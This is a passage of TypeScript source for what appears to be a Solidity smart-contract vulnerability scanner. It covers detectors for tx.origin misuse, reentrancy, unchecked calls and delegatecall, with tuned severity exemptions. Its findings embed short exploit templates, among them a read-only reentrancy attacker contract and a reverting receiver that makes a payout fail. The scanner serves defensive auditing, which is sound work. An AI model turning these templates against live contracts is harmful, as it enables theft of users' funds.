      summary: `This report hit the ${MAX_FINDINGS}-finding cap, so the ${omitted} lowest-severity finding(s) were not listed. They are not clean — raise the cap or audit the contract in smaller scopes to see them.`,
      walkthrough: "1. The detector set produced more findings than the report cap.\n2. Findings were sorted by severity, so the omitted ones are the least severe.\n3. Re-run against a narrower scope (a single contract or function) to list them.",
      exploitSolidity: "",
      remediationSolidity: "",
      locationFn: null,
      locationLine: null,
      snippet: "",
    }),
  );
  return kept;
}

function formatVer(v: number): string {
  const major = Math.floor(v / 1_000_000);
  const minor = Math.floor((v % 1_000_000) / 1_000);
  const patch = v % 1_000;
  return `${major}.${minor}.${patch}`;
}

// True when the ONLY use of tx.origin in src is the EOA-gate comparison
// msg.sender == tx.origin (either operand order). An EOA-gate BLOCKS
// contracts; it does not authenticate anyone: a phished EOA calling
// directly still passes, and no identity is derived from tx.origin.
// FomoXP's isHuman and MyobuChef's boostWithNFT both use it exactly
// this way ("no contracts"), and both were flagged as high-severity
// tx.origin authentication. Any other tx.origin use (compared to an
// owner, used as an address) stays the high auth finding.
function isEoaGateOnly(src: string): boolean {
  if (!/tx\.origin/.test(src)) return false;
  const stripped = src.replace(/msg\.sender\s*==\s*tx\.origin|tx\.origin\s*==\s*msg\.sender/g, "");
  return !/tx\.origin/.test(stripped);
}

// True when every remaining use of tx.origin (after EOA-gate
// comparisons are stripped) is a DENY: a negated check
// (!isBlacklisted(tx.origin)), an == false check, a != comparison,
// or an if(...) revert. A deny check BLOCKS rather than grants —
// CoinToken's require(!isBlacklisted(tx.origin)) extends its
// blacklist to forwarded calls. It authenticates nobody, and the
// auth-bypass framing does not apply (there is nothing to bypass:
// the check can only revert). At most a low over-blocking note. Any
// granting use (tx.origin == owner) stays the high auth finding.
function isTxOriginDenyOnly(src: string): boolean {
  if (!/tx\.origin/.test(src)) return false;
  let stripped = src.replace(/msg\.sender\s*==\s*tx\.origin|tx\.origin\s*==\s*msg\.sender/g, "");
  stripped = stripped
    .replace(/!\s*\w+\s*\(\s*tx\.origin\s*\)/g, "")
    .replace(/!\s*\w+\s*\[\s*tx\.origin\s*\]/g, "")
    .replace(/\w+\s*\(\s*tx\.origin\s*\)\s*==\s*false/g, "")
    .replace(/\w+\s*\[\s*tx\.origin\s*\]\s*==\s*false/g, "")
    .replace(/tx\.origin\s*!==?\s*[^,;)]+/g, "")
    .replace(/if\s*\(\s*\w+\s*\(\s*tx\.origin\s*\)\s*\)\s*revert/g, "");
  return !/tx\.origin/.test(stripped);
}

// True when a transfer's result is verified by a balance-delta check:
// balanceOf before, the transfer, balanceOf after, and a require on
// the delta. Such a transfer does not need its bool: the balance check
// catches false-returns AND fee-on-transfer shortfalls. Mythereum's
// _processERC20TokenPackPurchase does exactly this (balanceOf,
// transferFrom, balanceOf, require after >= before + cost) and was
// flagged for "ignoring" the bool it correctly refuses to trust.
function hasBalanceDeltaCheck(src: string): boolean {
  const balanceReads = src.match(/\.balanceOf\s*\(/g) ?? [];
  if (balanceReads.length < 2) return false;
  return /require\s*\([^;]*(balance|before|after)/i.test(src);
}

/**
 * Function names defined in the contract's bases, transitively
 * (Fix 16). The model does not flatten inheritance: contract.functions
 * holds only the functions defined in that contract. A bare
 * transfer(...) call in a token that inherits ERC20 resolves to the
 * base's transfer, which is still the contract's OWN transfer.
 */
function inheritedFnNames(contract: ContractModel, model: SourceModel): Set<string> {
  const names = new Set<string>();
  const byContract = new Map(model.contracts.map((c) => [c.name, c]));
  const seen = new Set<string>();
  const queue = [...contract.bases];
  while (queue.length) {
    const name = queue.shift()!;
    if (seen.has(name)) continue;
    seen.add(name);
    const base = byContract.get(name);
    if (!base) continue;
    for (const f of base.functions) names.add(f.name);
    queue.push(...base.bases);
  }
  return names;
}

/**
 * Fix 17: true when EVERY ether send in the function is ledger-bound —
 * recipient AND amount both come from the SAME stored mapping/struct
 * entry (pendingBids[id].bidder.transfer(pendingBids[id].amount)).
 * A send whose recipient is a stored entry but whose amount is a
 * caller-chosen value (or vice versa) is NOT ledger-bound. A function
 * with no sends is not a payout (false).
 */
/**
 * Strip payable(...) casts and outer parens from an expression.
 * Send targets arrive as the call base, so a transfer to
 * payable(msg.sender) has target `payable(msg.sender)`, not
 * `msg.sender` — the exemptions below compare against the bare form.
 */
function stripPayable(expr: string): string {
  let t = expr.trim();
  for (;;) {
    const m = t.match(/^payable\s*\((.*)\)$/s);
    if (m) { t = m[1].trim(); continue; }
    const p = t.match(/^\((.*)\)$/s);
    if (p) { t = p[1].trim(); continue; }
    return t;
  }
}

function allSendsLedgerBound(sendDetails: { target: string; amount: string }[]): boolean {
  if (sendDetails.length === 0) return false;
  const entry = /^([\w.]+)\[([^\]]+)\]\.(\w+)$/;
  return sendDetails.every(({ target, amount }) => {
    const t = entry.exec(stripPayable(target));
    const a = entry.exec(stripPayable(amount).replace(/^\(+|\)+$/g, ""));
    return Boolean(t && a && t[1] === a[1] && t[2] === a[2]);
  });
}

/**
 * Fix 18: true when EVERY ether send goes to an address a require
 * (or if) proves == msg.sender in stored-field form
 * (X.field == msg.sender / msg.sender == X.field) and the send target
 * is exactly that stored field. A bare `to == msg.sender` proof does
 * NOT count: a param equal to the caller is not a stored entitlement,
 * and exempting it would silence a full-balance drain with a vacuous
 * require. A literal msg.sender recipient with NO such require is
 * also NOT exempt (the open-drain shape: anyone drains the balance
 * to themselves).
 */
function allSendsRequireProvenSelf(fn: FnModel, sendTargets: string[]): boolean {
  if (sendTargets.length === 0) return false;
  const src = stripCommentsAndStrings(fn.source);
  // Exprs proven == msg.sender by an == comparison in the function.
  const senderEq = new Set<string>();
  for (const m of src.matchAll(/([A-Za-z_][\w.[\]]*)\s*==\s*msg\.sender|msg\.sender\s*==\s*([A-Za-z_][\w.[\]]*)/g)) {
    senderEq.add((m[1] ?? m[2] ?? "").trim());
  }
  if (senderEq.size === 0) return false;
  const isStoredField = (e: string) => e.includes(".") || e.includes("[");
  // Stored-field exprs appearing on the RHS of an assignment to target
  // (possibly wrapped, e.g. payable(pendingBids[id].bidder)).
  // `=(?!=)` keeps a `==` comparison from counting as an assignment.
  const assignedFromStoredField = (target: string): string[] => {
    const out: string[] = [];
    for (const m of src.matchAll(rx(`\\b${escapeRegExp(target)}\\s*=(?!=)\\s*([^;]*)`, "g"))) {
      for (const sm of m[1].matchAll(/[A-Za-z_][\w.]*\[[^\]]+\][\w.[\]]*/g)) out.push(sm[0]);
    }
    return out;
  };
  return sendTargets.every((t) => {
    const target = stripPayable(t);
    // (A) The target itself is proven == msg.sender and is a stored
    // field, or a local assigned from a stored field (case 78, and
    // the require-on-local shape, case 79).
    if (senderEq.has(target) && (isStoredField(target) || assignedFromStoredField(target).length > 0)) return true;
    // (B) The target is a local assigned from a stored-field expr
    // that is itself proven == msg.sender (require on the field,
    // send via a local).
    for (const s of assignedFromStoredField(target)) {
      if (senderEq.has(s)) return true;
    }
    return false;
  });
}

/**
 * Fix 23: true when the function clears a per-user mapping entry for
 * the caller (M[msg.sender] = 0, -=, or = M[...] - ...) AND every
 * ether send goes to msg.sender (or a local assigned from it). The
 * mapping name is unrestricted — presidentSalaries, votes, anything —
 * because the clearing IS the debit. Tying the exemption to a
 * self-send keeps a clearing + drain-to-param shape flagged.
 */
function isSameMappingClearingSelfPayout(fn: FnModel, sendTargets: string[]): boolean {
  if (sendTargets.length === 0) return false;
  const src = fn.source;
  // Sender aliases: msg.sender plus locals assigned from it.
  const aliases = new Set<string>(["msg.sender"]);
  for (const m of src.matchAll(/\b([A-Za-z_]\w*)\s*=\s*msg\.sender\b/g)) aliases.add(m[1]);
  const targetIsSelf = sendTargets.every((t) => aliases.has(stripPayable(t)));
  if (!targetIsSelf) return false;
  for (const alias of aliases) {
    const esc = escapeRegExp(alias);
    if (rx(`\\w+\\s*\\[\\s*${esc}\\s*\\]\\s*(=\\s*0\\b|-=)`).test(src)) return true;
    if (rx(`\\w+\\s*\\[\\s*${esc}\\s*\\]\\s*=\\s*\\w+\\s*\\[\\s*${esc}\\s*\\]\\s*-`).test(src)) return true;
  }
  return false;
}

/**
 * Fix 24: true when a library function is called from a non-library
 * contract function in this compilation — a qualified call
 * (Address.functionDelegateCall(...)) or a using-for member call
 * (.functionDelegateCall(...)). A library-internal delegatecall
 * utility with NO such call site is dead code for the contracts in
 * this file, not a reachable finding. Name-based for the member form
 * (fail closed: a same-named unrelated function still counts as a
 * call site); the qualified form is exact.
 */
function isLibraryDelegatecallCalledFromContract(libraryName: string, fnName: string, model: SourceModel): boolean {
  const qualified = rx(`\\b${escapeRegExp(libraryName)}\\s*\\.\\s*${escapeRegExp(fnName)}\\s*\\(`);
  const member = rx(`\\.\\s*${escapeRegExp(fnName)}\\s*\\(`);
  for (const c of model.contracts) {
    if (c.kind === "library") continue;
    for (const f of c.functions) {
      if (qualified.test(f.source) || member.test(f.source)) return true;
    }
  }
  return false;
}

function scanContract(
  contract: ContractModel,
  model: SourceModel,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
) {
  const stateNames = new Set(contract.stateVars.map((v) => v.name));
  const byName = new Map(contract.functions.map((f) => [f.name, f]));

  const direct = new Map<string, { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> }>();
  for (const fn of contract.functions) {
    direct.set(fn.name, profile(fn, stateNames, byName));
  }
  // Fixpoint: internal calls inherit writes and external-ness.
  let moved = true;
  while (moved) {
    moved = false;
    for (const fn of contract.functions) {
      const row = direct.get(fn.name);
      if (!row) continue;
      for (const callee of row.callees) {
        const other = direct.get(callee);
        if (!other) continue;
        if (other.external && !row.external) {
          row.external = true;
          moved = true;
        }
        for (const k of other.externalKinds) {
          if (!row.externalKinds.has(k)) {
            row.externalKinds.add(k);
            moved = true;
          }
        }
        for (const w of other.writes) {
          if (!row.writes.has(w)) {
            row.writes.add(w);
            moved = true;
          }
        }
      }
    }
  }

  for (const mod of contract.modifiers) {
    if (/tx\.origin/.test(mod.source)) {
      if (isEoaGateOnly(mod.source)) {
        push(make({
          severity: "low",
          swc: "SWC-115",
          title: `Modifier ${mod.name} uses an EOA-gate (tx.origin == msg.sender)`,
          confidence: "high",
          detector: "tx-origin",
          summary: "The modifier only requires msg.sender == tx.origin, which blocks contract callers. It authenticates nobody: a phished EOA calling directly still passes. It also blocks legitimate contract wallets, multisigs, and account-abstraction accounts.",
          walkthrough: "1. The modifier requires msg.sender == tx.origin, so any contract call is rejected.\n2. That blocks vaults, multisigs, and account-abstraction wallets — not just attackers.\n3. It authenticates nobody: a phished EOA calling directly still passes.",
          exploitSolidity: "",
          remediationSolidity: "// If the goal is blocking contracts, accept the tradeoff explicitly (it breaks multisigs/AA). If the goal is authentication, check msg.sender against an allowlist instead.",
          locationFn: mod.name,
          locationLine: mod.line,
          snippet: mod.source.split("\n").slice(0, 12).join("\n"),
        }));
      } else if (isTxOriginDenyOnly(mod.source)) {
        push(make({
          severity: "low",
          swc: "SWC-115",
          title: `Modifier ${mod.name} uses tx.origin in a deny check (blacklist)`,
          confidence: "high",
          detector: "tx-origin",
          summary: "The modifier only uses tx.origin in a negated/blacklist check, which blocks rather than grants. It authenticates nobody, and the auth-bypass framing does not apply: the check can only revert. The residual effect is over-blocking — a blacklisted EOA cannot use any contract to call through.",
          walkthrough: "1. The check denies when tx.origin is blacklisted; it never grants access.\n2. A forwarding contract cannot bypass it: tx.origin is still the blacklisted signer.\n3. The cost is over-blocking, not a bypass.",
          exploitSolidity: "",
          remediationSolidity: "// If the deny is intentional (blacklist covers forwarded calls), keep it and document the over-blocking. If the goal is authentication, check msg.sender instead.",
          locationFn: mod.name,
          locationLine: mod.line,
          snippet: mod.source.split("\n").slice(0, 12).join("\n"),
        }));
      } else {
        push(make({
          severity: "high",
          swc: "SWC-115",
          title: `Modifier ${mod.name} trusts tx.origin`,
          confidence: "high",
          detector: "tx-origin",
          summary: "An authorization modifier compares tx.origin. Any contract the authorized account calls can forward into a protected function.",
          walkthrough: originWalk(mod.name),
          exploitSolidity: originExploit(contract.name, "withdraw"),
          remediationSolidity: originFix(),
          locationFn: mod.name,
          locationLine: mod.line,
          snippet: mod.source.split("\n").slice(0, 12).join("\n"),
        }));
      }
    }
  }

  let anyPayable = false;
  let anyValueSend = false;
  // Fix 12: read-only reentrancy needs the writer's own window — its
  // first post-call write line, its in-window reads, and its in-window
  // internal calls — plus each callee's reads. Collected per function
  // during the walk; the read-only loop below consumes them.
  const flowsByFn = new Map<string, Flow>();
  const reenterWrites = new Map<string, { fn: string; call: ExtCall; writeLine: number }>();

  for (const fn of contract.functions) {
    if (fn.mutability === "payable" || fn.isReceive) anyPayable = true;
    if (!fn.body) continue;
    const authed = isAuthed(fn, contract, model) || fn.isConstructor;
    const flow = walkFn(fn, contract, model, stateNames, byName, direct, parsed, delta, push, authed);
    flowsByFn.set(fn.name, flow);
    if (flow.sawCall && flowSends(flow)) anyValueSend = true;
    if (/(\.call\s*\{[^}]*value|\.transfer\s*\(|\.send\s*\()/.test(fn.source)) anyValueSend = true;

    // A constructor cannot be reentered either: during construction the
    // contract has no code at its address, so no external caller can
    // re-enter it mid-construction. FUUUU's constructor calls createPair
    // then assigns router/pair/exemptFee — flagged as reentrancy, but
    // there is no window. Same reason as the read-only skip below.
    if (flow.callThenWrite && flow.seen && !fn.isConstructor) {
      const guarded = hasGuard(fn);
      // Evidence checks before calling it reentrancy:
      // - transfer/send forward only 2300 gas: a reentrant call cannot fit
      //   in that stipend, so there is no reentrancy window at all. The
      //   post-call write is ordering hygiene, not an exploit.
      // - If a per-user credit mapping (balanceOf, balances, ...) was written
      //   BEFORE the call and no credit mapping is written AFTER it, the
      //   double-spend path is closed: a reentrant call hits the require
      //   against the already-debited balance. Only aggregate state
      //   (e.g. totalSupply) updates after the call.
      const stipendCall = flow.seen.kind === "transfer" || flow.seen.kind === "send";
      const creditVars = new Set(
        contract.stateVars.filter((v) => v.typeName.trim().startsWith("mapping(")).map((v) => v.name),
      );
      const creditSettledPreCall =
        [...flow.preCallWrites].some((w) => creditVars.has(w)) &&
        ![...flow.postCallWrites].some((w) => creditVars.has(w));
      const severity: Severity = stipendCall
        ? "info"
        : guarded
          ? "low"
          : creditSettledPreCall
            ? "low"
            : flow.seen.sendsValue || flow.seen.kind === "call" || flow.seen.kind === "delegatecall"
              ? "critical"
              : flow.seen.kind === "member" || flow.seen.kind === "erc20"
                ? "medium"
                : "high";
      const title = stipendCall
        ? `State written after a 2300-gas transfer in ${fn.name} — no reentrancy window`
        : guarded
          ? `State is written after an external call in ${fn.name}, but a reentrancy guard is present`
          : creditSettledPreCall
            ? `Reentrancy: ${fn.name} updates non-credit state after an external call`
            : `Reentrancy: ${fn.name} updates state after an external call`;
      const summary = stipendCall
        ? `${fn.name} calls ${flow.seen.kind} at line ${flow.seen.line}, which forwards only 2300 gas — a reentrant call cannot fit in that stipend, so there is no window for an attacker to re-enter before the storage update. The post-call write is ordering hygiene, not an exploit.`
        : guarded
          ? `${fn.name} still does the external call before the storage update. The guard should hold, but the ordering is the bug the guard is papering over.`
          : creditSettledPreCall
            ? `${fn.name} hands control to another contract at line ${flow.seen.line}, then writes storage — but the caller's per-user credit was already debited before the call, so a reentrant call hits the balance check against the reduced balance and cannot double-spend. Only non-credit (aggregate) state updates after the call.`
            : `${fn.name} hands control to another contract at line ${flow.seen.line}, then writes storage. The callee can re-enter and observe the stale values.`;
      push(withAccessControlCap(make({
        severity,
        swc: "SWC-107",
        title,
        confidence: guarded ? "medium" : "high",
        detector: "reentrancy",
        summary,
        walkthrough: reentrancyWalk(contract.name, fn, flow.seen),
        exploitSolidity: reentrancyExploit(contract.name, fn.name),
        remediationSolidity: reentrancyFix(fn.name),
        locationFn: fn.name,
        locationLine: flow.seen.line,
        snippet: snippet(parsed, flow.seen.line + delta, delta),
      }), authed));
      // Read-only reentrancy only cares about vars that are actually stale
      // mid-callback: written AFTER the call. A var written only before the
      // call cannot be observed stale. And a 2300-gas transfer/send creates
      // no mid-callback window at all, so it produces no read-only surface.
      // And a constructor call cannot be reentered at all: during
      // construction the contract has no code at its address, so no
      // external caller can read its getters mid-callback. MyobuChef's
      // constructor calls router.WETH() before assigning WETH/startBlock/
      // numdays — flagged as 4 read-only highs, all impossible.
      if (!stipendCall && !fn.isConstructor) {
        for (const w of flow.postCallWrites) {
          const writeLine = flow.writeLines.get(w);
          if (writeLine !== undefined) reenterWrites.set(w, { fn: fn.name, call: flow.seen, writeLine });
        }
      }
    } else if (flow.writeThenCall && flow.sawCall && !fn.isConstructor && /for\s*\(|while\s*\(/.test(fn.source)) {
      push(make({
        severity: "medium",
        swc: "SWC-107",
        title: `External call inside a loop in ${fn.name}`,
        confidence: "medium",
        detector: "reentrancy",
        summary: "The loop both writes storage and calls out. Even if this iteration updates first, the callback can re-enter before later iterations finish.",
        walkthrough: reentrancyWalk(contract.name, fn, flow.seen),
        exploitSolidity: reentrancyExploit(contract.name, fn.name),
        remediationSolidity: reentrancyFix(fn.name),
        locationFn: fn.name,
        locationLine: fn.line,
        snippet: snippet(parsed, fn.line + delta, delta),
      }));
    }

    scanSimple(fn, contract, model, parsed, delta, authed, push);
  }

  // Fix 12: read-only reentrancy fires ONLY on a demonstrated
  // in-contract stale-read path. A public getter that no in-contract
  // code reads in the window is not a finding — the "second protocol
  // reads the getter" story is speculation, and every reaudit in this
  // batch (MC2long ×11, StakeWar rounds(), F3Dx ×6, OTTERY ×4,
  // AsyncArtwork) showed it firing on getters nobody consumes.
  // Consumer shapes:
  //   (a) the writer itself reads the var after its call but before
  //       its write (self-read in-window);
  //   (b) the writer calls another function in that window which
  //       reads the var (callee-read in-window).
  // The window is (call line, first post-call write line). A read on
  // the call line itself (the call target) or on the write line does
  // not count. The finding names the demonstrated consumer.
  // Limitation: (b) only sees own-contract callees (byName). A
  // super/base-contract callee that reads the var is not tracked, so
  // such a path is missed — accepted for this batch; no transitive
  // callee-body analysis.
  for (const [varName, info] of reenterWrites) {
    const variable = contract.stateVars.find((v) => v.name === varName);
    if (variable?.visibility !== "public") continue;
    const writerFlow = flowsByFn.get(info.fn);
    let consumer: string | null = null;
    let consumerFn: string | null = null;
    if (writerFlow) {
      const selfReads = writerFlow.readLines.get(varName) ?? [];
      const selfRead = selfReads.find((l) => l > info.call.line && l < info.writeLine);
      if (selfRead !== undefined) {
        consumer = `${info.fn} itself reads ${varName} at line ${selfRead}, after the call but before the write`;
        consumerFn = info.fn;
      } else {
        for (const cc of writerFlow.calleeCalls) {
          if (cc.line <= info.call.line || cc.line >= info.writeLine) continue;
          const calleeReads = flowsByFn.get(cc.name)?.readLines.get(varName) ?? [];
          if (calleeReads.length > 0) {
            consumer = `${info.fn} calls ${cc.name} at line ${cc.line}, which reads ${varName}`;
            consumerFn = cc.name;
            break;
          }
        }
      }
    }
    if (consumer === null) continue;
    // Fix 35: a demonstrated consumer earns high only when it can move
    // value on the stale read. When the in-window consumer is itself a
    // view/pure function — the named-getter family from the archive
    // poll (round_(), uniswapV2Pair(), balances(), plyr_(), kLast(),
    // depositLock(), numOfShares(): ~102 critical/high rows, none
    // reproduced) — it merely RETURNS the stale value; nothing in the
    // window settles, pays out, or prices off it in a state-changing
    // path. That is low, and the summary names what would corroborate
    // high. The writer reading its own var in-window (self-read) is a
    // state-changing consumption and stays high. A consumer that
    // cannot be resolved in this contract (inherited) cannot be shown
    // to move value either, so it takes the low path.
    const consumerModel = consumerFn ? contract.functions.find((f) => f.name === consumerFn) : undefined;
    const getterOnlyConsumer =
      consumerFn !== null &&
      consumerFn !== info.fn &&
      (consumerModel === undefined || consumerModel.mutability === "view" || consumerModel.mutability === "pure");
    {
      push(make({
        severity: getterOnlyConsumer ? "low" : "high",
        swc: "SWC-107",
        title: `Read-only reentrancy on ${varName}()`,
        confidence: "medium",
        detector: "read-only-reentrancy",
        summary: getterOnlyConsumer
          ? `${info.fn} calls out before ${varName} is updated, and ${varName} is a public getter. The stale value is consumed in-contract: ${consumer}. Downgraded to low: the in-window consumer (${consumerFn}) is ${consumerModel ? "view/pure — it only returns the value" : "not resolvable in this contract — no value-moving use could be shown"}, so nothing in the window settles, pays out, or prices off the stale read in a state-changing path. This rises to high when a state-changing function in the window consumes the stale value to move value — a settle, mint, borrow, or payout computed from it.`
          : `${info.fn} calls out before ${varName} is updated, and ${varName} is a public getter. The stale value is consumed in-contract: ${consumer}.`,
        walkthrough: [
          `1. ${info.fn} transfers control at line ${info.call.line} via ${info.call.kind}.`,
          `2. ${varName} still holds the pre-call value, because the write happens at line ${info.writeLine}, after the call returns.`,
          `3. The stale value is consumed in-contract: ${consumer}.`,
          "4. A re-entrant call during the window observes the pre-call value and can price or settle off it.",
        ].join("\n"),
        exploitSolidity: `interface IVictim { function ${varName}(address) external view returns (uint256); function ${info.fn}() external; function ${consumerFn}() external; }
contract ReadOnlyAttack {
    function attack(address victim) external {
        IVictim(victim).${info.fn}();
    }
    receive() external payable {
        // The in-window consumer reads the stale value here.
        IVictim(msg.sender).${consumerFn}();
    }
}`,
        remediationSolidity: `// Update ${varName} before the call, and add a nonReentrant guard
// so view methods used as oracles are not observable mid-call.
modifier nonReentrant() {
    require(locked == 0);
    locked = 1;
    _;
    locked = 0;
}`,
        locationFn: `${varName}()`,
        locationLine: variable.line,
        snippet: snippet(parsed, variable.line + delta, delta),
      }));
    }
  }

  if (anyPayable && !anyValueSend) {
    push(make({
      severity: "medium",
      swc: "SWC-132",
      title: `${contract.name} can receive ether it cannot send`,
      confidence: "medium",
      detector: "locked-ether",
      summary: "A payable function, receive, or fallback accepts ETH, and nothing in the contract transfers value out. The balance is stuck.",
      walkthrough: "1. Ether arrives through a payable entry.\n2. No call{value}, transfer, or send exists on this contract.\n3. There is no recovery path. Selfdestruct elsewhere does not help once the code is deployed.",
      exploitSolidity: "",
      remediationSolidity: `function rescue(address payable to) external onlyOwner {
    (bool ok, ) = to.call{value: address(this).balance}("");
    require(ok);
}`,
      locationFn: null,
      locationLine: contract.line,
      snippet: "",
    }));
  }

  const ownerDrain = contract.functions.some((fn) => isAuthed(fn, contract, model) && /address\(this\)\.balance/.test(fn.source) && /\.call\{|\.transfer\(/.test(fn.source));
  if (ownerDrain) {
    push(make({
      severity: "low",
      swc: null,
      title: `${contract.name} lets one privileged key move the whole balance`,
      confidence: "high",
      detector: "centralization",
      summary: "An authenticated function can forward address(this).balance. That is a rug path if the key is an EOA, a hot wallet, or a single signer.",
      walkthrough: "1. The function is gated, so this is not an unauthenticated theft.\n2. It is still a single point of failure: the key, not the rules, controls user funds.\n3. A timelock, a multisig, or a capped withdrawal changes the trust assumption.",
      exploitSolidity: "",
      remediationSolidity: `// Two-step: queue the withdrawal, execute after a delay.
// Or cap it: require(amount <= address(this).balance / 10);`,
      locationFn: null,
      locationLine: contract.line,
      snippet: "",
    }));
  }

  if (contract.bases.some((b) => /upgrade|proxy|erc1967/i.test(b)) && !contract.stateVars.some((v) => v.name === "__gap")) {
    push(make({
      severity: "low",
      swc: null,
      title: `${contract.name} looks upgradeable and has no storage gap`,
      confidence: "low",
      detector: "storage-gap",
      summary: "Inheritance from a proxy/upgrade base without a uint256[N] __gap means a later variable shifts every slot in child contracts.",
      walkthrough: "1. Upgradeable layouts are append-only.\n2. Inserting a variable in a base contract moves the child's slots and silently corrupts balances.\n3. Reserve a gap and shrink it when you add a variable.",
      exploitSolidity: "",
      remediationSolidity: "uint256[50] private __gap;",
      locationFn: null,
      locationLine: contract.line,
      snippet: "",
    }));
  }
}

function flowSends(flow: Flow): boolean {
  return Boolean(flow.seen?.sendsValue);
}

function profile(fn: FnModel, stateNames: Set<string>, byName: Map<string, FnModel>) {
  const writes = new Set<string>();
  const callees = new Set<string>();
  let external = false;
  // Which low-level call kinds the function (transitively) uses. A
  // callee whose only external effects are 2300-gas transfer/send has
  // no reentrancy window; a callee using call/delegatecall does.
  const externalKinds = new Set<string>();
  const visit = (node: unknown) => {
    if (!node || typeof node !== "object") return;
    if (Array.isArray(node)) {
      node.forEach(visit);
      return;
    }
    const n = node as AstNode;
    if (n.type === "BinaryOperation" && typeof n.operator === "string" && ASSIGN.has(n.operator)) {
      const id = rootIdent(n.left as AstNode);
      if (id && stateNames.has(id)) writes.add(id);
    }
    if (n.type === "UnaryOperation" && (n.operator === "++" || n.operator === "--" || n.operator === "delete")) {
      const id = rootIdent(n.subExpression as AstNode);
      if (id && stateNames.has(id)) writes.add(id);
    }
    if (n.type === "FunctionCall") {
      const callee = unwrapCallee(n.expression as AstNode);
      // Fix 15: super.* calls are internal JUMPs, not external calls.
      const isSuper = callee.base?.type === "Identifier" && (callee.base as AstNode).name === "super";
      if (callee.member && LOW_LEVEL.has(callee.member) && !isSuper) {
        external = true;
        externalKinds.add(callee.member);
      }
      if (callee.member === "push" || callee.member === "pop") {
        const id = rootIdent(callee.base ?? undefined);
        if (id && stateNames.has(id)) writes.add(id);
      }
      if (!callee.base && callee.member && byName.has(callee.member) && callee.member !== fn.name) {
        callees.add(callee.member);
      }
      if (callee.base && rootIdent(callee.base) === "this") {
        external = true;
        externalKinds.add("call");
      }
    }
    if (n.type === "AssemblyCall" && n.functionName === "sstore") writes.add("*");
    for (const [k, v] of Object.entries(n)) {
      if (k === "loc" || k === "range") continue;
      if (v && typeof v === "object") visit(v);
    }
  };
  visit(fn.body);
  return { writes, external, callees, externalKinds };
}

function walkFn(
  fn: FnModel,
  contract: ContractModel,
  model: SourceModel,
  stateNames: Set<string>,
  byName: Map<string, FnModel>,
  direct: Map<string, { writes: Set<string>; external: boolean; callees: Set<string>; externalKinds: Set<string> }>,
  parsed: string,
  delta: number,
  push: (f: Finding) => void,
  authed: boolean,
): Flow {
  const flow: Flow = { seen: null, sawWrite: false, sawCall: false, callThenWrite: false, writeThenCall: false, preCallWrites: new Set(), postCallWrites: new Set(), sawEtherSend: false, sendTargets: [], allSendsAreRefunds: true, writeLines: new Map(), readLines: new Map(), calleeCalls: [], sendDetails: [] };
  const consts = new Set(contract.stateVars.filter((v) => v.constOrImmutable).map((v) => v.name));
  const params = new Set(fn.params.map((p) => p.name).filter(Boolean));
  const inherited = inheritedFnNames(contract, model);

  const noteWrite = (node: AstNode | undefined) => {
    const id = rootIdent(node);
    const assembly = node?.type === "AssemblyCall";
    if (!assembly && (!id || !stateNames.has(id))) return;
    const writeKey = id || "*";
    flow.sawWrite = true;
    if (flow.seen) {
      flow.callThenWrite = true;
      flow.postCallWrites.add(writeKey);
      if (!flow.writeLines.has(writeKey)) flow.writeLines.set(writeKey, lineOf(node, delta, fn.line));
    } else {
      flow.preCallWrites.add(writeKey);
    }
  };

  const noteCall = (call: ExtCall) => {
    flow.sawCall = true;
    if (call.kind === "transfer" || call.kind === "send" || (call.kind === "call" && call.sendsValue)) {
      flow.sawEtherSend = true;
      flow.sendTargets.push(call.target);
      if (!call.synthetic) flow.sendDetails.push({ target: call.target, amount: call.amount ?? "" });
      if (!/msg\.sender/.test(call.target ?? "") || !/msg\.value/.test(call.raw ?? "")) flow.allSendsAreRefunds = false;
    }
    if (flow.sawWrite && !flow.callThenWrite) flow.writeThenCall = true;
    if (!flow.seen) flow.seen = call;
    if (!call.checked && (call.kind === "call" || call.kind === "send" || call.kind === "delegatecall" || call.kind === "staticcall" || call.kind === "callcode")) {
      push(make({
        severity: call.kind === "send" ? "medium" : "high",
        swc: "SWC-104",
        title: `${fn.name} ignores the ${call.kind} result`,
        confidence: "high",
        detector: "unchecked-call",
        summary: `The ${call.kind} at line ${call.line} is used as a statement. A false or revert from the callee does not stop the rest of ${fn.name}.`,
        walkthrough: [
          `1. \`.call\`, \`.send\`, \`.delegatecall\` return false on failure. They do not revert the caller.`,
          "2. Discarding that bool means the following state update runs anyway.",
          "3. For an ether payout, the accounting says the user was paid when they were not — or the reverse, if the update already happened and a later assumption depends on success.",
        ].join("\n"),
        exploitSolidity: `contract Reject {
    receive() external payable { revert("nope"); }
}
// Point the payout at this contract. The victim still records the withdrawal.`,
        remediationSolidity: `(bool ok, ) = target.call{value: amount}("");
require(ok, "transfer failed");`,
        locationFn: fn.name,
        locationLine: call.line,
        snippet: snippet(parsed, call.line + delta, delta),
      }));
    }
    // Fix 24: a library-internal delegatecall utility with no reachable
    // call site in a non-library contract is not a finding — the OZ
    // Address functionDelegateCall shape (BallerBananas, saudibird,
    // Rugs: the library utility is dead code for the contracts in the
    // file). The finding still fires when a non-library function calls
    // the utility, or when the delegatecall is in a non-library
    // contract (existing rules below). Scope note: an internal
    // delegatecall in a NON-library contract with no caller is still
    // flagged — dead-code analysis for ordinary contracts is out of
    // scope for this batch; the library-utility case is the one with
    // three confirmed FPs.
    if ((call.kind === "delegatecall" || call.kind === "callcode") && !(contract.kind === "library" && !isLibraryDelegatecallCalledFromContract(contract.name, fn.name, model))) {
      // StarkWare upgradeTo: the target is NOT freely chosen — it must
      // be a governance-pre-registered, time-locked implementation.
      // An access-controlled function whose delegatecall target is
      // constrained by stored-state validation is a governance-trust
      // note (info), not a critical exploit: the caller cannot redirect
      // execution to an arbitrary contract.
      if (authed && call.targetIsParam && call.target && delegateTargetIsConstrained(fn.source, call.target)) {
        push(make({
          severity: "info",
          swc: "SWC-112",
          title: `${fn.name} delegatecalls a governance-allowlisted implementation`,
          confidence: "high",
          detector: "delegatecall",
          summary: "The delegatecall target must pass stored-state validation (pre-registered / allowlisted, possibly time-locked) and the function is access-controlled, so the caller cannot redirect execution to an arbitrary contract. The residual risk is governance trust: whoever controls the allowlist controls the implementation.",
          walkthrough: delegateWalk(fn.name, call),
          exploitSolidity: "",
          remediationSolidity: `Keep the allowlist + timelock, and keep the function access-controlled.`,
          locationFn: fn.name,
          locationLine: call.line,
          snippet: snippet(parsed, call.line + delta, delta),
        }));
      } else if (authed && PROXY_UPGRADE_FNS.has(fn.name) && isProxyShape(contract)) {
